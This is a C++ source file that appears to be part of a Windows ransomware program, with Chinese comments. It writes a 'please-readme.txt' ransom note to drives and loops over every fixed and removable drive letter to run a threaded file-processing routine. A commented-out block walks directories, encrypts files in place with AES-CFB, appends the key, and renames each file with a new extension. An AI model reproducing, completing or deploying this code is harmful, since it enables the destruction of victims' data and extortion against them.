#define _CRT_SECURE_NO_WARNINGS
#include"CryptFunction.h"

//全局
string lpBody;
LPWSTR lpFileName = (WCHAR*)malloc(2 * MAX_PATH);

BOOL WriteReadme(wstring lpAddress) {
	lstrcpyW(lpFileName, lpAddress.c_str());
	lstrcatW(lpFileName, L"\\please-readme.txt");
	HANDLE hFile = CreateFileW(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) return FALSE;
	DWORD dwWrittenByte = 0;
	if (!WriteFile(hFile, (LPCVOID)lpBody.c_str(), lpBody.length(), &dwWrittenByte, NULL)) {
		CloseHandle(hFile);
		return false;
	}
	CloseHandle(hFile);
	return TRUE;
}

//取文件后缀
static wstring getFileSuffix(wstring str)
{
	wstring::size_type idx = str.rfind(L'.');
	wstring suffix = str.substr(idx + 1, str.length());
	return suffix;
}
static wstring getFileName(wstring str)
{
	wstring::size_type idx = str.rfind(L'.');
	wstring Name = str.substr(0, idx);
	return Name;
}
//bool ListFiles(wstring path, wstring mask, vector<wstring>& files) {
//	HANDLE hFind = INVALID_HANDLE_VALUE;
//	WIN32_FIND_DATA ffd;
//	wstring spec;
//	stack<wstring> directories;
//
//	directories.push(path);
//	files.clear();
//
//	while (!directories.empty()) {
//		path = directories.top();
//		//WriteReadme(path);
//		spec = path + L"\\" + mask;
//		directories.pop();
//
//		hFind = FindFirstFile(spec.c_str(), &ffd);
//		if (hFind == INVALID_HANDLE_VALUE) {
//			return false;
//		}
//
//		do {
//			if (wcscmp(ffd.cFileName, L".") != 0 &&
//				wcscmp(ffd.cFileName, L"..") != 0) {
//				if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
//					if (!JsonCompare(whiteFloder, ffd.cFileName))
//						directories.push(path + L"\\" + ffd.cFileName);
//				}
//				else {
//					if (!JsonCompare(whiteFiles, ffd.cFileName)) {
//						wstring wstringname = (getFileSuffix(ffd.cFileName).c_str());
//						LPCWSTR extensionname = wstringname.c_str();
//						if (!JsonCompare(whiteExtension, (LPWSTR)extensionname))
//							files.push_back(path + L"\\" + ffd.cFileName);
//					}
//
//				}
//			}
//		} while (FindNextFile(hFind, &ffd) != 0);
//
//		if (GetLastError() != ERROR_NO_MORE_FILES) {
//			FindClose(hFind);
//			return false;
//		}
//
//		FindClose(hFind);
//		hFind = INVALID_HANDLE_VALUE;
//	}
//
//	return true;
//}
//VOID CryptFunction(wstring path) {
//	static vector<wstring> files;
//	ListFiles(path, L"*", files);
//	DWORD BYTES_PER_SECTOR;
//	GetDiskFreeSpace(NULL, NULL, &BYTES_PER_SECTOR, NULL, NULL);
//
//	CryptoPP::AutoSeededRandomPool rnd;
//	//Generate a random key
//	CryptoPP::SecByteBlock key(0x00, CryptoPP::AES::DEFAULT_KEYLENGTH);
//	rnd.GenerateBlock(key, key.size());
//	CryptoPP::SecByteBlock iv(CryptoPP::AES::BLOCKSIZE);
//	rnd.GenerateBlock(iv, iv.size());
//	static string Gen_sk_key = base64_encode(string(key.begin(), key.end()));
//	for (vector<wstring>::iterator it = files.begin(); it != files.end(); &it++)
//	{
//		HANDLE hFile = CreateFileW(it->c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
//		if (hFile == INVALID_HANDLE_VALUE) continue;
//		LARGE_INTEGER Size = { 0 };
//		GetFileSizeEx(hFile, &Size);
//		size_t buffer_size = ((BYTES_PER_SECTOR + ((Size.LowPart + BYTES_PER_SECTOR) - 1)) & ~(BYTES_PER_SECTOR - 1));
//		LPVOID lpBuffer = new BYTE[buffer_size + 64]{ 0 };
//		DWORD NumberOfBytesRead;
//		DWORD NumberOfBytesWritten;
//		ReadFile(hFile, lpBuffer, Size.LowPart, &NumberOfBytesRead, NULL);
//		CFB_Mode<AES>::Encryption cfbEncryption(key, key.size(), iv);
//		cfbEncryption.ProcessData((PBYTE)lpBuffer, (PBYTE)lpBuffer, NumberOfBytesRead);
//		
//		WriteFile(hFile, lpBuffer, NumberOfBytesRead, &NumberOfBytesWritten, NULL);
//		WriteFile(hFile, Gen_sk_key.c_str(), Gen_sk_key.length(), &NumberOfBytesWritten, NULL);
//		CloseHandle(hFile);
//		wstring NewName = getFileName(it->c_str()) +L"." + extension_name;
//		MoveFile(it->c_str(), NewName.c_str());
//		return;
//	}
//}
VOID CallListfile() {
	wstring src;
	wstring dst;
	SYSTEM_INFO si;
	GetSystemInfo(&si);
	io::IoPool ioPool(si.dwNumberOfProcessors);

	for (int i = L'A'; i < L'Z'; i++)
	{
		char a[20];
		sprintf(a, "\\\\?\\%c:\\", i);
		if (GetDriveTypeA(a) - 2 <= DRIVE_REMOVABLE) {
			static WCHAR wpath[20];
			wsprintf(wpath, L"%c:\\", i);
			src = wpath;
			dst = wpath;
			copy::CopyFiles(ioPool, src, dst);
		}
	}
}

VOID CryptMainFunction()
{
	lpBody = base64_decode(Base64nbody);
	CallListfile();
	//io::IoPool ioPool(4);
	//wstring src = L"C:\\Users\\awei_\\Pictures\\壁紙1\\";
	//wstring dst = L"C:\\Users\\awei_\\Pictures\\壁紙1\\";
	//copy::CopyFiles(ioPool, src, dst);

	return;
}
